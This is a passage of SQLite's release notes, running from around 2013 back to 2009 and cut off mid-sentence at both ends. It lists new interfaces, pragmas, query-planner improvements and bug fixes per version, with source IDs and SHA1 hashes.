statements run from within the implementation of application-defined SQL functions if the function is called by a SELECT statement that does not access any database table. Disable the use of posix_fallocate() on all (unix) systems unless the HAVE_POSIX_FALLOCATE compile-time option is used. Update the \".import\" command in the command-line shell to support multi-line fields and correct RFC-4180 quoting and to issue warning and/or error messages if the input text is not strictly RFC-4180 compliant. Bug fix: In the unicode61 tokenizer of FTS4, treat all private code points as identifier symbols. Bug fix: Bare identifiers in ORDER BY clauses bind more tightly to output column names, but identifiers in expressions bind more tightly to input column names. Identifiers in GROUP BY clauses always prefer output column names, however. Bug fixes: Multiple problems in the legacy query optimizer were fixed by the move to NGQP. SQLITE_SOURCE_ID: \"2013-08-26 04:50:08 f64cd21e2e23ed7cff48f7dafa5e76adde9321c2\" SHA1 for sqlite3.c: b7347f4b4c2a840e6ba12040093d606bd16ea21e 2013-05-20 (3.7.17) Add support for memory-mapped I/O. Add the sqlite3_strglob() convenience interface. Assigned the integer at offset 68 in the database header as the Application ID for when SQLite is used as an application file-format. Added the PRAGMA application_id command to query and set the Application ID. Report rollback recovery in the error log as SQLITE_NOTICE_RECOVER_ROLLBACK. Change the error log code for WAL recover from SQLITE_OK to SQLITE_NOTICE_RECOVER_WAL. Report the risky uses of unlinked database files and database filename aliasing as SQLITE_WARNING messages in the error log. Added the SQLITE_TRACE_SIZE_LIMIT compile-time option. Increase the default value of SQLITE_MAX_SCHEMA_RETRY to 50 and make sure that it is honored in every place that a schema change might force a statement retry. Add a new test harness called \"mptester\" used to verify correct operation when multiple processes are using the same database file at the same time. Enhance the extension loading mechanism to be more flexible (while still maintaining backwards compatibility) in two ways: If the default entry point \"sqlite3_extension_init\" is not present in the loadable extension, also try an entry point \"sqlite3_X_init\" where \"X\" is based on the shared library filename. This allows every extension to have a different entry point, which allows them to be statically linked with no code changes. The shared library filename passed to sqlite3_load_extension() may omit the filename suffix, and an appropriate architecture-dependent suffix (\".so\", \".dylib\", or \".dll\") will be added automatically. Added many new loadable extensions to the source tree, including amatch, closure, fuzzer, ieee754, nextchar, regexp, spellfix, and wholenumber. See header comments on each extension source file for further information about what that extension does. Enhance FTS3 to avoid using excess stack space when there are a huge number of terms on the right-hand side of the MATCH operator. A side-effect of this change is that the MATCH operator can only accommodate 12 NEAR operators at a time. Enhance the fts4aux virtual table so that it can be a TEMP table. Added the fts3tokenize virtual table to the full-text search logic. Query planner enhancement: Use the transitive property of constraints to move constraints into the outer loops of a join whenever possible, thereby reducing the amount of work that needs to occur in inner loops. Discontinue the use of posix_fallocate() on unix, as it does not work on all filesystems. Improved tracing and debugging facilities in the Windows VFS. Bug fix: Fix a potential database corruption bug in shared cache mode when one database connection is closed while another is in the middle of a write transaction. Ticket e636a050b7 Bug fix: Only consider AS names from the result set as candidates for resolving identifiers in the WHERE clause if there are no other matches. In the ORDER BY clause, AS names take priority over any column names. Ticket 2500cdb9be05 Bug fix: Do not allow a virtual table to cancel the ORDER BY clause unless all outer loops are guaranteed to return no more than one row result. Ticket ba82a4a41eac1. Bug fix: Do not suppress the ORDER BY clause on a virtual table query if an IN constraint is used. Ticket f69b96e3076e. Bug fix: The command-line shell gives an exit code of 0 when terminated using the \".quit\" command. Bug fix: Make sure PRAGMA statements appear in sqlite3_trace() output. Bug fix: When a compound query that uses an ORDER BY clause with a COLLATE operator, make sure that the sorting occurs according to the specified collation and that the comparisons associate with the compound query use the native collation. Ticket 6709574d2a8d8. Bug fix: Makes sure the authorizer callback gets a valid pointer to the string \"ROWID\" for the column-name parameter when doing an UPDATE that changes the rowid. Ticket 0eb70d77cb05bb2272 Bug fix: Do not move WHERE clause terms inside OR expressions that are contained within an ON clause of a LEFT JOIN. Ticket f2369304e4 Bug fix: Make sure an error is always reported when attempting to preform an operation that requires a collating sequence that is missing. Ticket 0fc59f908b SQLITE_SOURCE_ID: \"2013-05-20 00:56:22 118a3b35693b134d56ebd780123b7fd6f1497668\" SHA1 for sqlite3.c: 246987605d0503c700a08b9ee99a6b5d67454aab 2013-04-12 (3.7.16.2) Fix a bug (present since version 3.7.13) that could result in database corruption on windows if two or more processes try to access the same database file at the same time and immediately after third process crashed in the middle of committing to that same file. See ticket 7ff3120e4f for further information. SQLITE_SOURCE_ID: \"2013-04-12 11:52:43 cbea02d93865ce0e06789db95fd9168ebac970c7\" SHA1 for sqlite3.c: d466b54789dff4fb0238b9232e74896deaefab94 2013-03-29 (3.7.16.1) Fix for a bug in the ORDER BY optimizer that was introduced in version 3.7.15 which would sometimes optimize out the sorting step when in fact the sort was required. Ticket a179fe7465 Fix a long-standing bug in the CAST expression that would recognize UTF16 characters as digits even if their most-significant-byte was not zero. Ticket 689137afb6da41. Fix a bug in the NEAR operator of FTS3 when applied to subfields. Ticket 38b1ae018f. Fix a long-standing bug in the storage engine that would (very rarely) cause a spurious report of an SQLITE_CORRUPT error but which was otherwise harmless. Ticket 6bfb98dfc0c. The SQLITE_OMIT_MERGE_SORT option has been removed. The merge sorter is now a required component of SQLite. Fixed lots of spelling errors in the source-code comments SQLITE_SOURCE_ID: \"2013-03-29 13:44:34 527231bc67285f01fb18d4451b28f61da3c4e39d\" SHA1 for sqlite3.c: 7a91ceceac9bcf47ceb8219126276e5518f7ff5a 2013-03-18 (3.7.16) Added the PRAGMA foreign_key_check command. Added new extended error codes for all SQLITE_CONSTRAINT errors Added the SQLITE_READONLY_ROLLBACK extended error code for when a database cannot be opened because it needs rollback recovery but is read-only. Added SQL functions unicode(A) and char(X1,...,XN). Performance improvements for PRAGMA incremental_vacuum, especially in cases where the number of free pages is greater than what will fit on a single trunk page of the freelist. Improved optimization of queries containing aggregate min() or max(). Enhance virtual tables so that they can potentially use an index when the WHERE clause contains the IN operator. Allow indices to be used for sorting even if prior terms of the index are constrained by IN operators in the WHERE clause. Enhance the PRAGMA table_info command so that the \"pk\" column is an increasing integer to show the order of columns in the primary key. Enhance the query optimizer to exploit transitive join constraints. Performance improvements in the query optimizer. Allow the error message from PRAGMA integrity_check to be longer than 20000 bytes. Improved name resolution for deeply nested queries. Added the test_regexp.c module as a demonstration of how to implement the REGEXP operator. Improved error messages in the RTREE extension. Enhance the command-line shell so that a non-zero argument to the \".exit\" command causes the shell to exit immediately without cleanly shutting down the database connection. Improved error messages for invalid boolean arguments to dot-commands in the command-line shell. Improved error messages for \"foreign key mismatch\" showing the names of the two tables involved. Remove all uses of umask() in the unix VFS. Added the PRAGMA vdbe_addoptrace and PRAGMA vdbe_debug commands. Change to use strncmp() or the equivalent instead of memcmp() when comparing non-zero-terminated strings. Update cygwin interfaces to omit deprecated API calls. Enhance the spellfix1 extension so that the edit distance cost table can be changed at runtime by inserting a string like 'edit_cost_table=TABLE' into the \"command\" field. Bug fix: repair a long-standing problem that could cause incorrect query results in a 3-way or larger join that compared INTEGER fields against TEXT fields in two or more places. Ticket fc7bd6358f Bug fix: Issue an error message if the 16-bit reference counter on a view overflows due to an overly complex query. Bug fix: Avoid leaking memory on LIMIT and OFFSET clauses in deeply nested UNION ALL queries. Bug fix: Make sure the schema is up-to-date prior to running pragmas table_info, index_list, index_info, and foreign_key_list. SQLITE_SOURCE_ID: \"2013-03-18 11:39:23 66d5f2b76750f3520eb7a495f6247206758f5b90\" SHA1 for sqlite3.c: 7308ab891ca1b2ebc596025cfe4dc36f1ee89cf6 2013-01-09 (3.7.15.2) Fix a bug, introduced in version 3.7.15, that causes an ORDER BY clause to be optimized out of a three-way join when the ORDER BY is actually required. Ticket 598f5f7596b055 SQLITE_SOURCE_ID: \"2013-01-09 11:53:05 c0e09560d26f0a6456be9dd3447f5311eb4f238f\" SHA1 for sqlite3.c: 5741f47d1bc38aa0a8c38f09e60a5fe0031f272d 2012-12-19 (3.7.15.1) Fix a bug, introduced in version 3.7.15, that causes a segfault if the AS name of a result column of a SELECT statement is used as a logical term in the WHERE clause. Ticket a7b7803e8d1e869. SQLITE_SOURCE_ID: \"2012-12-19 20:39:10 6b85b767d0ff7975146156a99ad673f2c1a23318\" SHA1 for sqlite3.c: bbbaa68061e925bd4d7d18d7e1270935c5f7e39a 2012-12-12 (3.7.15) Added the sqlite3_errstr() interface. Avoid invoking the sqlite3_trace() callback multiple times when a statement is automatically reprepared due to SQLITE_SCHEMA errors. Added support for Windows Phone 8 platforms Enhance IN operator processing to make use of indices with numeric affinities. Do full-table scans using covering indices when possible, under the theory that an index will be smaller and hence can be scanned with less I/O. Enhance the query optimizer so that ORDER BY clauses are more aggressively optimized, especially in joins where various terms of the ORDER BY clause come from separate tables of the join. Add the ability to implement FROM clause subqueries as coroutines rather that manifesting the subquery into a temporary table. Enhancements the command-line shell: Added the \".print\" command Negative numbers in the \".width\" command cause right-alignment Add the \".wheretrace\" command when compiled with SQLITE_DEBUG Added the busy_timeout pragma. Added the instr() SQL function. Added the SQLITE_FCNTL_BUSYHANDLER file control, used to allow VFS implementations to get access to the busy handler callback. The xDelete method in the built-in VFSes now return SQLITE_IOERR_DELETE_NOENT if the file to be deleted does not exist. Enhanced support for QNX. Work around an optimizer bug in the MSVC compiler when targeting ARM. Bug fix: Avoid various concurrency problems in shared cache mode. Bug fix: Avoid a deadlock or crash if the backup API, shared cache, and the SQLite Encryption Extension are all used at once. Bug fix: SQL functions created using the TCL interface honor the \"nullvalue\" setting. Bug fix: Fix a 32-bit overflow problem on CREATE INDEX for databases larger than 16GB. Bug fix: Avoid segfault when using the COLLATE operator inside of a CHECK constraint or view in shared cache mode. SQLITE_SOURCE_ID: \"2012-12-12 13:36:53 cd0b37c52658bfdf992b1e3dc467bae1835a94ae\" SHA1 for sqlite3.c: 2b413611f5e3e3b6ef5f618f2a9209cdf25cbcff\" 2012-10-04 (3.7.14.1) Fix a bug (ticket [d02e1406a58ea02d]]) that causes a segfault on a LEFT JOIN that includes an OR in the ON clause. Work around a bug in the optimizer in the VisualStudio-2012 compiler that causes invalid code to be generated when compiling SQLite on ARM. Fix the TCL interface so that the \"nullvalue\" setting is honored for TCL implementations of SQL functions. SQLITE_SOURCE_ID: \"2012-10-04 19:37:12 091570e46d04e84b67228e0bdbcd6e1fb60c6bdb\" SHA1 for sqlite3.c: 62aaecaacab3a4bf4a8fe4aec1cfdc1571fe9a44 2012-09-03 (3.7.14) Drop built-in support for OS/2. If you need to upgrade an OS/2 application to use this or a later version of SQLite, then add an application-defined VFS using the sqlite3_vfs_register() interface. The code removed in this release can serve as a baseline for the application-defined VFS. Ensure that floating point values are preserved exactly when reconstructing a database from the output of the \".dump\" command of the command-line shell. Added the sqlite3_close_v2() interface. Updated the command-line shell so that it can be built using SQLITE_OMIT_FLOATING_POINT and SQLITE_OMIT_AUTOINIT. Improvements to the windows makefiles and build processes. Enhancements to PRAGMA integrity_check and PRAGMA quick_check so that they can optionally check just a single attached database instead of all attached databases. Enhancements to WAL mode processing that ensure that at least one valid read-mark is available at all times, so that read-only processes can always read the database. Performance enhancements in the sorter used by ORDER BY and CREATE INDEX. Added the SQLITE_DISABLE_FTS4_DEFERRED compile-time option. Better handling of aggregate queries where the aggregate functions are contained within subqueries. Enhance the query planner so that it will try to use a covering index on queries that make use of or optimization. SQLITE_SOURCE_ID: \"2012-09-03 15:42:36 c0d89d4a9752922f9e367362366efde4f1b06f2a\" SHA1 for sqlite3.c: 5fdf596b29bb426001f28b488ff356ae14d5a5a6 2012-06-11 (3.7.13) In-memory databases that are specified using URI filenames are allowed to use shared cache, so that the same in-memory database can be accessed from multiple database connections. Recognize and use the mode=memory query parameter in URI filenames. Avoid resetting the schema of shared cache connections when any one connection closes. Instead, wait for the last connection to close before resetting the schema. In the RTREE extension, when rounding 64-bit floating point numbers to 32-bit for storage, always round in a direction that causes the bounding box to get larger. Adjust the unix driver to avoid unnecessary calls to fchown(). Add interfaces sqlite3_quota_ferror() and sqlite3_quota_file_available() to the test_quota.c module. The sqlite3_create_module() and sqlite3_create_module_v2() interfaces return SQLITE_MISUSE on any attempt to overload or replace a virtual table module. The destructor is always called in this case, in accordance with historical and current documentation. SQLITE_SOURCE_ID: \"2012-06-11 02:05:22 f5b5a13f7394dc143aa136f1d4faba6839eaa6dc\" SHA1 for sqlite3.c: ff0a771d6252545740ba9685e312b0e3bb6a641b 2012-05-22 (3.7.12.1) Fix a bug (ticket c2ad16f997) in the 3.7.12 release that can cause a segfault for certain obscure nested aggregate queries. Fix various other minor test script problems. SQLITE_SOURCE_ID: \"2012-05-22 02:45:53 6d326d44fd1d626aae0e8456e5fa2049f1ce0789\" SHA1 for sqlite3.c: d494e8d81607f0515d4f386156fb0fd86d5ba7df 2012-05-14 (3.7.12) Add the SQLITE_DBSTATUS_CACHE_WRITE option for sqlite3_db_status(). Optimize the typeof() and length() SQL functions so that they avoid unnecessary reading of database content from disk. Add the FTS4 \"merge\" command, the FTS4 \"automerge\" command, and the FTS4 \"integrity-check\" command. Report the name of specific CHECK constraints that fail. In the command-line shell, use popen() instead of fopen() if the first character of the argument to the \".output\" command is \"|\". Make use of OVERLAPPED in the windows VFS to avoid some system calls and thereby obtain a performance improvement. More aggressive optimization of the AND operator when one side or the other is always false. Improved performance of queries with many OR-connected terms in the WHERE clause that can all be indexed. Add the SQLITE_RTREE_INT_ONLY compile-time option to force the R*Tree Extension Module to use integer instead of floating point values for both storage and computation. Enhance the PRAGMA integrity_check command to use much less memory when processing multi-gigabyte databases. New interfaces added to the test_quota.c add-on module. Added the \".trace\" dot-command to the command-line shell. Allow virtual table constructors to be invoked recursively. Improved optimization of ORDER BY clauses on compound queries. Improved optimization of aggregate subqueries contained within an aggregate query. Bug fix: Fix the RELEASE command so that it does not cancel pending queries. This repairs a problem introduced in 3.7.11. Bug fix: Do not discard the DISTINCT as superfluous unless a subset of the result set is subject to a UNIQUE constraint and it none of the columns in that subset can be NULL. Ticket 385a5b56b9. Bug fix: Do not optimize away an ORDER BY clause that has the same terms as a UNIQUE index unless those terms are also NOT NULL. Ticket 2a5629202f. SQLITE_SOURCE_ID: \"2012-05-14 01:41:23 8654aa9540fe9fd210899d83d17f3f407096c004\" SHA1 for sqlite3.c: 57e2104a0f7b3f528e7f6b7a8e553e2357ccd2e1 2012-03-20 (3.7.11) Enhance the INSERT syntax to allow multiple rows to be inserted via the VALUES clause. Enhance the CREATE VIRTUAL TABLE command to support the IF NOT EXISTS clause. Added the sqlite3_stricmp() interface as a counterpart to sqlite3_strnicmp(). Added the sqlite3_db_readonly() interface. Added the SQLITE_FCNTL_PRAGMA file control, giving VFS implementations the ability to add new PRAGMA statements or to override built-in PRAGMAs. Queries of the form: \"SELECT max(x), y FROM table\" returns the value of y on the same row that contains the maximum x value. Added support for the FTS4 languageid option. Documented support for the FTS4 content option. This feature has actually been in the code since version 3.7.9 but is only now considered to be officially supported. Pending statements no longer block ROLLBACK. Instead, the pending statement will return SQLITE_ABORT upon next access after the ROLLBACK. Improvements to the handling of CSV inputs in the command-line shell Fix a bug introduced in version 3.7.10 that might cause a LEFT JOIN to be incorrectly converted into an INNER JOIN if the WHERE clause indexable terms connected by OR. SQLITE_SOURCE_ID: \"2012-03-20 11:35:50 00bb9c9ce4f465e6ac321ced2a9d0062dc364669\" SHA1 for sqlite3.c: d460d7eda3a9dccd291aed2a9fda868b9b120a10 2012-01-16 (3.7.10) The default schema format number is changed from 1 to 4. This means that, unless the PRAGMA legacy_file_format=ON statement is run, newly created database files will be unreadable by version of SQLite prior to 3.3.0 (2006-01-10). It also means that the descending indices are enabled by default. The sqlite3_pcache_methods structure and the SQLITE_CONFIG_PCACHE and SQLITE_CONFIG_GETPCACHE configuration parameters are deprecated. They are replaced by a new sqlite3_pcache_methods2 structure and SQLITE_CONFIG_PCACHE2 and SQLITE_CONFIG_GETPCACHE2 configuration parameters. Added the powersafe overwrite property to the VFS interface. Provide the SQLITE_IOCAP_POWERSAFE_OVERWRITE I/O capability, the SQLITE_POWERSAFE_OVERWRITE compile-time option, and the \"psow=BOOLEAN\" query parameter for URI filenames. Added the sqlite3_db_release_memory() interface and the shrink_memory pragma. Added the sqlite3_db_filename() interface. Added the sqlite3_stmt_busy() interface. Added the sqlite3_uri_boolean() and sqlite3_uri_int64() interfaces. If the argument to PRAGMA cache_size is negative N, that means to use approximately -1024*N bytes of memory for the page cache regardless of the page size. Enhanced the default memory allocator to make use of _msize() on windows, malloc_size() on Mac, and malloc_usable_size() on Linux. Enhanced the query planner to support index queries with range constraints on the rowid. Enhanced the query planner flattening logic to allow UNION ALL compounds to be promoted upwards to replace a simple wrapper SELECT even if the compounds are joins. Enhanced the query planner so that the xfer optimization can be used with INTEGER PRIMARY KEY ON CONFLICT as long as the destination table is initially empty. Enhanced the windows VFS so that all system calls can be overridden using the xSetSystemCall interface. Updated the \"unix-dotfile\" VFS to use locking directories with mkdir() and rmdir() instead of locking files with open() and unlink(). Enhancements to the test_quota.c extension to support stdio-like interfaces with quotas. Change the unix VFS to be tolerant of read() system calls that return less then the full number of requested bytes. Change both unix and windows VFSes to report a sector size of 4096 instead of the old default of 512. In the TCL Interface, add the -uri option to the \"sqlite3\" TCL command used for creating new database connection objects. Added the SQLITE_TESTCTRL_EXPLAIN_STMT test-control option with the SQLITE_ENABLE_TREE_EXPLAIN compile-time option to enable the command-line shell to display ASCII-art parse trees of SQL statements that it processes, for debugging and analysis. Bug fix: Add an additional xSync when restarting a WAL in order to prevent an exceedingly unlikely but theoretically possible database corruption following power-loss. Ticket ff5be73dee. Bug fix: Change the VDBE so that all registers are initialized to Invalid instead of NULL. Ticket 7bbfb7d442 Bug fix: Fix problems that can result from 32-bit integer overflow. Ticket ac00f496b7e2 SQLITE_SOURCE_ID: \"2012-01-16 13:28:40 ebd01a8deffb5024a5d7494eef800d2366d97204\" SHA1 for sqlite3.c: 6497cbbaad47220bd41e2e4216c54706e7ae95d4 2011-11-01 (3.7.9) If a search token (on the right-hand side of the MATCH operator) in FTS4 begins with \"^\" then that token must be the first in its field of the document. ** Potentially Incompatible Change ** Added options SQLITE_DBSTATUS_CACHE_HIT and SQLITE_DBSTATUS_CACHE_MISS to the sqlite3_db_status() interface. Removed support for SQLITE_ENABLE_STAT2, replacing it with the much more capable SQLITE_ENABLE_STAT3 option. Enhancements to the sqlite3_analyzer utility program, including the --pageinfo and --stats options and support for multiplexed databases. Enhance the sqlite3_data_count() interface so that it can be used to determine if SQLITE_DONE has been seen on the prepared statement. Added the SQLITE_FCNTL_OVERWRITE file-control by which the SQLite core indicates to the VFS that the current transaction will overwrite the entire database file. Increase the default lookaside memory allocator allocation size from 100 to 128 bytes. Enhanced the query planner so that it can factor terms in and out of OR expressions in the WHERE clause in an effort to find better indices. Added the SQLITE_DIRECT_OVERFLOW_READ compile-time option, causing overflow pages to be read directly from the database file, bypassing the page cache. Remove limits on the magnitude of precision and width value in the format specifiers of the sqlite3_mprintf() family of string rendering routines. Fix a bug that prevent ALTER TABLE ... RENAME from working on some virtual tables in a database with a UTF16 encoding. Fix a bug in ASCII-to-float conversion that causes slow performance and incorrect results when converting numbers with ridiculously large exponents. Fix a bug that causes incorrect results in aggregate queries that use multiple aggregate functions whose arguments contain complicated expressions that differ only in the case of string literals contained within those expressions. Fix a bug that prevented the page_count and quick_check pragmas from working correctly if their names were capitalized. Fix a bug that caused VACUUM to fail if the count_changes pragma was engaged. Fix a bug in virtual table implementation that causes a crash if an FTS4 table is dropped inside a transaction and a SAVEPOINT occurs afterwards. SQLITE_SOURCE_ID: \"2011-11-01 00:52:41 c7c6050ef060877ebe77b41d959e9df13f8c9b5e\" SHA1 for sqlite3.c: becd16877f4f9b281b91c97e106089497d71bb47 2011-09-19 (3.7.8) Orders of magnitude performance improvement for CREATE INDEX on very large tables. Improved the windows VFS to better defend against interference from anti-virus software. Improved query plan optimization when the DISTINCT keyword is present. Allow more system calls to be overridden in the unix VFS - to provide better support for chromium sandboxes. Increase the default size of a lookahead cache line from 100 to 128 bytes. Enhancements to the test_quota.c module so that it can track preexisting files. Bug fix: Virtual tables now handle IS NOT NULL constraints correctly. Bug fixes: Correctly handle nested correlated subqueries used with indices in a WHERE clause. SQLITE_SOURCE_ID: \"2011-09-19 14:49:19 3e0da808d2f5b4d12046e05980ca04578f581177\" SHA1 for sqlite3.c: bfcd74a655636b592c5dba6d0d5729c0f8e3b4de 2011-06-28 (3.7.7.1) Fix a bug causing PRAGMA case_sensitive_like statements compiled using sqlite3_prepare() to fail with an SQLITE_SCHEMA error. SQLITE_SOURCE_ID: \"2011-06-28 17:39:05 af0d91adf497f5f36ec3813f04235a6e195a605f\" SHA1 for sqlite3.c: d47594b8a02f6cf58e91fb673e96cb1b397aace0 2011-06-23 (3.7.7) Add support for URI filenames Add the sqlite3_vtab_config() interface in support of ON CONFLICT clauses with virtual tables. Add the xSavepoint, xRelease and xRollbackTo methods in virtual tables in support of SAVEPOINT for virtual tables. Update the built-in FTS3/FTS4 and RTREE virtual tables to support ON CONFLICT clauses and REPLACE. Avoid unnecessary reparsing of the database schema. Added support for the FTS4 prefix option and the FTS4 order option. Allow WAL-mode databases to be opened read-only as long as there is an existing read/write connection. Added support for short filenames. SQLITE_SOURCE_ID: \"2011-06-23 19:49:22 4374b7e83ea0a3fbc3691f9c0c936272862f32f2\" SHA1 for sqlite3.c: 5bbe79e206ae5ffeeca760dbd0d66862228db551 2011-05-19 (3.7.6.3) Fix a problem with WAL mode which could cause transactions to silently rollback if the cache_size is set very small (less than 10) and SQLite comes under memory pressure. 2011-04-17 (3.7.6.2) Fix the function prototype for the open(2) system call to agree with POSIX. Without this fix, pthreads does not work correctly on NetBSD. SQLITE_SOURCE_ID: \"2011-04-17 17:25:17 154ddbc17120be2915eb03edc52af1225eb7cb5e\" SHA1 for sqlite3.c: 806577fd524dd5f3bfd8d4d27392ed2752bc9701 2011-04-13 (3.7.6.1) Fix a bug in 3.7.6 that only appears if the SQLITE_FCNTL_SIZE_HINT file control is used with a build of SQLite that makes use of the HAVE_POSIX_FALLOCATE compile-time option and which has SQLITE_ENABLE_LOCKING_MODE turned off. SQLITE_SOURCE_ID: \"2011-04-13 14:40:25 a35e83eac7b185f4d363d7fa51677f2fdfa27695\" SHA1 for sqlite3.c: b81bfa27d3e09caf3251475863b1ce6dd9f6ab66 2011-04-12 (3.7.6) Added the sqlite3_wal_checkpoint_v2() interface and enhanced the wal_checkpoint pragma to support blocking checkpoints. Improvements to the query planner so that it makes better estimates of plan costs and hence does a better job of choosing the right plan, especially when SQLITE_ENABLE_STAT2 is used. Fix a bug which prevented deferred foreign key constraints from being enforced when sqlite3_finalize() was not called by one statement with a failed foreign key constraint prior to another statement with foreign key constraints running. Integer arithmetic operations that would have resulted in overflow are now performed using floating-point instead. Increased the version number on the VFS object to 3 and added new methods xSetSysCall, xGetSysCall, and xNextSysCall used for doing full-coverage testing. Increase the maximum value of SQLITE_MAX_ATTACHED from 30 to 62 (though the default value remains at 10). Enhancements to FTS4: Added the fts4aux table Added support for compressed FTS4 content Enhance the ANALYZE command to support the name of an index as its argument, in order to analyze just that one index. Added the \"unix-excl\" built-in VFS on unix and unix-like platforms. SQLITE_SOURCE_ID: \"2011-04-12 01:58:40 f9d43fa363d54beab6f45db005abac0a7c0c47a7\" SHA1 for sqlite3.c: f38df08547efae0ff4343da607b723f588bbd66b 2011-02-01 (3.7.5) Added the sqlite3_vsnprintf() interface. Added the SQLITE_DBSTATUS_LOOKASIDE_HIT, SQLITE_DBSTATUS_LOOKASIDE_MISS_SIZE, and SQLITE_DBSTATUS_LOOKASIDE_MISS_FULL options for the sqlite3_db_status() interface. Added the SQLITE_OMIT_AUTORESET compile-time option. Added the SQLITE_DEFAULT_FOREIGN_KEYS compile-time option. Updates to sqlite3_stmt_readonly() so that its result is well-defined for all prepared statements and so that it works with VACUUM. Added the \"-heap\" option to the command-line shell Fix a bug involving frequent changes in and out of WAL mode and VACUUM that could (in theory) cause database corruption. Enhance the sqlite3_trace() mechanism so that nested SQL statements such as might be generated by virtual tables are shown but are shown in comments and without parameter expansion. This greatly improves tracing output when using the FTS3/4 and/or RTREE virtual tables. Change the xFileControl() methods on all built-in VFSes to return SQLITE_NOTFOUND instead of SQLITE_ERROR for an unrecognized operation code. The SQLite core invokes the SQLITE_FCNTL_SYNC_OMITTED file control to the VFS in place of a call to xSync if the database has PRAGMA synchronous set to OFF. 2010-12-07 (3.7.4) Added the sqlite3_blob_reopen() interface to allow an existing sqlite3_blob object to be rebound to a new row. Use the new sqlite3_blob_reopen() interface to improve the performance of FTS. VFSes that do not support shared memory are allowed to access WAL databases if PRAGMA locking_mode is set to EXCLUSIVE. Enhancements to EXPLAIN QUERY PLAN. Added the sqlite3_stmt_readonly() interface. Added PRAGMA checkpoint_fullfsync. Added the SQLITE_FCNTL_FILE_POINTER option to sqlite3_file_control(). Added support for FTS4 and enhancements to the FTS matchinfo() function. Added the test_superlock.c module which provides example code for obtaining an exclusive lock to a rollback or WAL database. Added the test_multiplex.c module which provides an example VFS that provides multiplexing (sharding) of a DB, splitting it over multiple files of fixed size. A very obscure bug associated with the or optimization was fixed. 2010-10-08 (3.7.3) Added the sqlite3_create_function_v2() interface that includes a destructor callback. Added support for custom r-tree queries using application-supplied callback routines to define the boundary of the query region. The default page cache strives more diligently to avoid using memory beyond what is allocated to it by SQLITE_CONFIG_PAGECACHE. Or if using page cache is allocating from the heap, it strives to avoid going over the sqlite3_soft_heap_limit64(), even if SQLITE_ENABLE_MEMORY_MANAGEMENT is not set. Added the sqlite3_soft_heap_limit64() interface as a replacement for sqlite3_soft_heap_limit(). The ANALYZE command now gathers statistics on tables even if they have no indices. Tweaks to the query planner to help it do a better job of finding the most efficient query plan for each query. Enhanced the internal text-to-numeric conversion routines so that they work with UTF8 or UTF16, thereby avoiding some UTF16-to-UTF8 text conversions. Fix a problem that was causing excess memory usage with large WAL transactions in win32 systems. The interface between the VDBE and B-Tree layer is enhanced such that the VDBE provides hints to the B-Tree layer letting the B-Tree layer know when it is safe to use hashing instead of B-Trees for transient tables. Miscellaneous documentation enhancements. 2010-08-24 (3.7.2) Fix an old and very obscure bug that can lead to corruption of the database free-page list when incremental_vacuum is used. 2010-08-23 (3.7.1) Added new commands SQLITE_DBSTATUS_SCHEMA_USED and SQLITE_DBSTATUS_STMT_USED to the sqlite3_db_status() interface, in order to report out the amount of memory used to hold the schema and prepared statements of a connection. Increase the maximum size of a database pages from 32KiB to 64KiB. Use the LIKE optimization even if the right-hand side string contains no wildcards. Added the SQLITE_FCNTL_CHUNK_SIZE verb to the sqlite3_file_control() interface for both unix and windows, to cause database files to grow in large chunks in order to reduce disk fragmentation. Fixed a bug in the query planner that caused performance regressions relative to 3.6.23.1 on some complex joins. Fixed a typo in the OS/2 backend. Refactored the pager module. The SQLITE_MAX_PAGE_SIZE compile-time option is now silently ignored. The maximum page size is hard-coded at 65536 bytes. 2010-08-04 (3.7.0.1) Fix a potential database corruption bug that can occur if version 3.7.0 and version 3.6.23.1 alternately write to the same database file. Ticket [51ae9cad317a1] Fix a performance regression related to the query planner enhancements of version 3.7.0. 2010-07-21 (3.7.0) Added support for write-ahead logging. Query planner enhancement - automatic transient indices are created when doing so reduces the estimated query time. Query planner enhancement - the ORDER BY becomes a no-op if the query also contains a GROUP BY clause that forces the correct output order. Add the SQLITE_DBSTATUS_CACHE_USED verb for sqlite3_db_status(). The logical database size is now stored in the database header so that bytes can be appended to the end of the database file without corrupting it and so that SQLite will work correctly on systems that lack support for ftruncate(). 2010-03-26 (3.6.23.1) Fix a bug in the offsets() function of FTS3 Fix a missing \"sync\" that when omitted could lead to database corruption if a power failure or OS crash occurred just as a ROLLBACK operation was finishing. 2010-03-09 (3.6.23) Added the secure_delete pragma. Added the sqlite3_compileoption_used() and sqlite3_compileoption_get() interfaces as well as the compile_options pragma and the sqlite_compileoption_used() and sqlite_compileoption_get() SQL functions. Added the sqlite3_log() interface together with the SQLITE_CONFIG_LOG verb to sqlite3_config(). The \".log\" command is added to the Command Line Interface. Improvements to FTS3. Improvements and bug-fixes in support for SQLITE_OMIT_FLOATING_POINT. The integrity_check pragma is enhanced to detect out-of-order rowids. The \".genfkey\" operator has been removed from the Command Line Interface. Updates to the co-hosted Lemon LALR(1) parser generator. (These updates did not affect SQLite.) Various minor bug fixes and performance enhancements. 2010-01-06 (3.6.22) Fix bugs that can (rarely) lead to incorrect query results when the CAST or OR operators are used in the WHERE clause of a query. Continuing enhancements and improvements to FTS3. Other miscellaneous bug fixes. 2009-12-07 (3.6.21) The SQL output resulting from sqlite3_trace() is now modified to include the values of bound parameters. Performance optimizations targeting a specific use case from a single high-profile user of SQLite. A 12% reduction in the number of CPU operations is achieved (as measured by Valgrind). Actual performance improvements in practice may vary depending on workload. Changes include: The ifnull() and coalesce() SQL functions are now implemented using in-line VDBE code rather than calling external functions, so that unused arguments need never be evaluated. The substr() SQL function does not bother to measure the length its entire input string if it is only computing a prefix Unnecessary OP_IsNull, OP_Affinity, and OP_MustBeInt VDBE opcodes are suppressed Various code refactorizations for performance The FTS3 extension has undergone a major rework and cleanup. New FTS3 documentation is now available. The SQLITE_SECURE_DELETE compile-time option fixed to make sure that content is deleted even when the truncate optimization applies. Improvements to \"dot-command\" handling in the Command Line Interface. Other minor bug fixes and documentation enhancements. 2009-11-04 (3.6.20) Optimizer enhancement: prepared statements are automatically re-compiled when a binding on the RHS of a LIKE operator changes or when any range constraint changes under SQLITE_ENABLE_STAT2. Various minor bug fixes and documentation enhancements. 2009-10-30 (3.6.16.1) A small patch to version 3.6.16 to fix the OP_If bug. 2009-10-14 (3.6.19) Added support for foreign key constraints. Foreign key constraints are disabled by default. Use the foreign_keys pragma to turn them on. Generalized the IS and IS NOT operators to take arbitrary expressions on their right-hand side. The TCL Interface has been enhanced to use the Non-Recursive Engine (NRE) interface to the TCL interpreter when linked against TCL 8.6 or later. Fix a bug introduced in 3.6.18 that can lead to a segfault when an attempt is made to write on a 